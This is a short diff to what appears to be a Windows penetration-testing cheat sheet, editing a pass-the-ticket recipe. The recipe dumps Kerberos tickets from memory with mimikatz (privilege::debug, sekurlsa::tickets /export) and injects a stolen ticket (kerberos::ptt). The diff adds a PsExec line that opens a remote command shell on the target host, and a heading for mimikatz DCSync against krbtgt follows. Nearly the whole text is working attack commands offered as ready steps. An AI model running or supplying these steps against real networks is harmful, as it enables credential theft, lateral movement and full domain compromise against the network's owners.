@@ -252,8 +252,9 @@ net use \\$TARGET_IP
 privilege::debug
 sekurlsa::tickets /export
 #ls *.kirbi
-#select ticket from target host
+#select ticket matching target host
 kerberos::ptt $TICKET
+.\PsExec.exe \\$TARGET_IP cmd
 ```
 mimikatz as domain admin:
 #mimikatz #dcsync #dc-sync #krbtgt
